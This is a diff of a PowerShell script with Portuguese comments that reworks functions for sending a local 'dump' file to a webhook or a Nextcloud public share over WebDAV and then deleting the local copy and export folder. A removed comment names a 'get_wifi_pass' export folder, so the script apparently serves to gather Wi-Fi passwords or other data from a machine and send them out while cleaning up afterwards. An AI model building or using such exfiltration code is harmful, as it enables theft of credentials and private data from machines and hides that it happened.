@@ -292,20 +292,28 @@ SSD >> PWD
 }
 
 
+# ==============================================================================
+# 1. FUNÇÃO DE ENVIO INTERNA (Com Timestamp no nome para Nextcloud e Webhook)
+# ==============================================================================
 function send_file_to_webhook {
     [CmdletBinding()]
     param(
         [Parameter(Mandatory=$true)]
-        [string]$FilePath,                     # caminho completo ou nome de arquivo dentro de %TEMP%
+        [string]$FilePath,
 
         [Parameter(Mandatory=$true)]
-        [string]$WebhookUrl,                   # URL do webhook para onde enviar
+        [string]$WebhookUrl,
 
-        [string]$Titulo = [System.IO.Path]::GetFileName($FilePath), # parâmetro de título com fallback para o nome do arquivo
+        [string]$Titulo = [System.IO.Path]::GetFileName($FilePath),
 
-        [string]$ExportDir = $ExportDirDefault,  # pasta de exportação (a mesma usada por get_wifi_pass)
-        [switch]$RemoveExportDir                # se setado, remove a pasta ExportDir após envio
+        [string]$ExportDir,
+        [switch]$RemoveExportDir
     )
+
+    # Fallback para ExportDir
+    if ([string]::IsNullOrWhiteSpace($ExportDir) -and (Test-Path Variable:ExportDirDefault)) {
+        $ExportDir = $global:ExportDirDefault
+    }
 
     # Resolve o caminho do arquivo
     $resolvedPath = $null
@@ -317,41 +325,74 @@ function send_file_to_webhook {
         }
     } else {
         $candidate1 = Join-Path $env:TEMP $FilePath
-        $candidate2 = Join-Path $ExportDir $FilePath
+        $candidate2 = if ($ExportDir) { Join-Path $ExportDir $FilePath } else { $null }
 
         if (Test-Path -Path $candidate1 -PathType Leaf) {
             $resolvedPath = (Resolve-Path -Path $candidate1).ProviderPath
-        } elseif (Test-Path -Path $candidate2 -PathType Leaf) {
+        } elseif ($candidate2 -and (Test-Path -Path $candidate2 -PathType Leaf)) {
             $resolvedPath = (Resolve-Path -Path $candidate2).ProviderPath
         } else {
-            throw "Arquivo '$FilePath' não encontrado em %TEMP% nem em $ExportDir."
+            throw "Arquivo '$FilePath' não encontrado nos diretórios locais."
         }
     }
 
-    # Envia e apaga o arquivo após envio
+    # Processamento e Envio
     try {
-        # Lê o conteúdo do arquivo
-        $fileContent = Get-Content -Path $resolvedPath -Raw -Encoding UTF8
+        # Gera o sufixo de data/hora (ex: _20260923_093648)
+        $timestamp = (Get-Date).ToString("yyyyMMdd_HHmmss")
+        $fileBaseName = [System.IO.Path]::GetFileNameWithoutExtension($resolvedPath)
+        $fileExtension = [System.IO.Path]::GetExtension($resolvedPath)
 
-        # Monta a string no formato "Titulo: conteudo"
-        $payloadText = "${Titulo}: ${fileContent}"
+        # Nome final do arquivo com data e hora
+        $uniqueFileName = "${fileBaseName}_${timestamp}${fileExtension}"
 
-        # Converte a string montada para bytes UTF-8
-        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadText)
+        # Identifica se a URL é de um compartilhamento do Nextcloud (/s/TOKEN)
+        if ($WebhookUrl -match '/s/([a-zA-Z0-9]+)') {
+            # --- MODO NEXTCLOUD (WebDAV) ---
+            $token = $Matches[1]
+            
+            $uri = [System.Uri]$WebhookUrl
+            $baseUrl = "$($uri.Scheme)://$($uri.Authority)"
+            
+            # Autenticação Basic com o token do compartilhamento
+            $authPair = "${token}:"
+            $authBytes = [System.Text.Encoding]::UTF8.GetBytes($authPair)
+            $authBase64 = [System.Convert]::ToBase64String($authBytes)
 
-        # Envia a requisição
-        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'
+            $headers = @{
+                "X-Requested-With" = "XMLHttpRequest"
+                "Authorization"    = "Basic $authBase64"
+            }
 
-        # Remove o arquivo após envio
+            # Tenta a rota pública padrão com o novo nome único
+            $destinationUrl = "$baseUrl/public.php/webdav/" + [System.Uri]::EscapeDataString($uniqueFileName)
+
+            try {
+                Invoke-RestMethod -Uri $destinationUrl -Method Put -InFile $resolvedPath -Headers $headers -ContentType 'application/octet-stream'
+            } catch {
+                # Fallback para rota moderna
+                $fallbackUrl = "$baseUrl/public.php/dav/files/$token/" + [System.Uri]::EscapeDataString($uniqueFileName)
+                Invoke-RestMethod -Uri $fallbackUrl -Method Put -InFile $resolvedPath -Headers $headers -ContentType 'application/octet-stream'
+            }
+        } else {
+            # --- MODO WEBHOOK PADRÃO ---
+            $fileContent = Get-Content -Path $resolvedPath -Raw -Encoding UTF8
+            $payloadText = "${Titulo} (${timestamp}): ${fileContent}"
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadText)
+
+            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'
+        }
+
+        # Remove o arquivo local temporário após o envio bem-sucedido
         if (Test-Path -Path $resolvedPath) {
             Remove-Item -Path $resolvedPath -Force -ErrorAction SilentlyContinue
         }
     } catch {
-        throw "Falha ao enviar para webhook '$WebhookUrl': $_"
+        throw "Falha no envio para '$WebhookUrl': $_"
     } finally {
-        # Remove exportdir apenas se solicitado explicitamente
+        # Limpeza opcional do diretório
         try {
-            if ($RemoveExportDir.IsPresent) {
+            if ($RemoveExportDir.IsPresent -and $ExportDir) {
                 if ((Test-Path -Path $ExportDir) -and ($ExportDir.StartsWith($env:TEMP))) {
                     Remove-Item -Path $ExportDir -Recurse -Force -ErrorAction SilentlyContinue
                 }
@@ -361,11 +402,13 @@ function send_file_to_webhook {
         }
     }
 
-    return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date); Titulo = $Titulo }
+    return @{ FileSent = $resolvedPath; RemoteFileName = $uniqueFileName; Webhook = $WebhookUrl; Time = (Get-Date); Titulo = $Titulo }
 }
 
 
-######### Chama a funcao e salva o arquivo $OutFile em $ExportDir #########
+# ==============================================================================
+# 2. FUNÇÃO AUXILIAR DE DUMP DE DADOS
+# ==============================================================================
 function Invoke-DataDump {
     [CmdletBinding()]
     param(
@@ -380,12 +423,10 @@ function Invoke-DataDump {
     )
 
     try {
-        # Executa o comando passado via ScriptBlock
         $out = &$DumpCommand
 
-        # Se o comando não retornar o caminho em texto, usa o OutputFile
         if ([string]::IsNullOrWhiteSpace($out)) {
-            $out =$OutputFile
+            $out = $OutputFile
         }
 
         Write-Host "Arquivo gerado em: $out"
@@ -397,7 +438,9 @@ function Invoke-DataDump {
 }
 
 
-####### Enviar ao Webhook ######
+# ==============================================================================
+# 3. FUNÇÃO PRINCIPAL WRAPPER
+# ==============================================================================
 function Send-DumpToWebhook {
     [CmdletBinding()]
     param(
@@ -417,33 +460,31 @@ function Send-DumpToWebhook {
         [switch]$RemoveExportDir
     )
 
-    # Executa apenas se a URL do Webhook for informada
     if (-not [string]::IsNullOrWhiteSpace($WebhookUrl)) {
         try {
-            Write-Host "Enviando para webhook: $WebhookUrl"
+            Write-Host "Enviando para o destino: $WebhookUrl"
 
-            # Monta os parâmetros dinamicamente (Splatting)
             $splatParams = @{
                 FilePath   = $FilePath
                 WebhookUrl = $WebhookUrl
                 Titulo     = $Title
             }
 
-            if ($ExportDir) { $splatParams['ExportDir'] =$ExportDir }
-            if ($RemoveExportDir) { $splatParams['RemoveExportDir'] =$true }
+            if ($ExportDir) { $splatParams['ExportDir'] = $ExportDir }
+            if ($RemoveExportDir) { $splatParams['RemoveExportDir'] = $true }
 
-            # Executa a função interna de envio
             $sendResult = send_file_to_webhook @splatParams
 
-            # Exibe o resultado checando o retorno do objeto
-            if ($null -ne $sendResult) {$fileSent = if ($sendResult.PSObject.Properties['FileSent']) {$sendResult.FileSent } else { $FilePath }$timeSent = if ($sendResult.PSObject.Properties['Time']) {$sendResult.Time } else { (Get-Date) }
+            if ($null -ne $sendResult) {
+                $fileSent = if ($sendResult.RemoteFileName) { $sendResult.RemoteFileName } else { $FilePath }
+                $timeSent = if ($sendResult.Time) { $sendResult.Time } else { (Get-Date) }
 
-                Write-Host "Envio concluído: $fileSent em$timeSent"
+                Write-Host "Envio concluído: $fileSent em $timeSent"
             } else {
                 Write-Host "Envio concluído com sucesso."
             }
         } catch {
-            Write-Error "Erro durante envio para webhook: $_"
+            Write-Error "Erro durante envio: $_"
         }
     }
 }
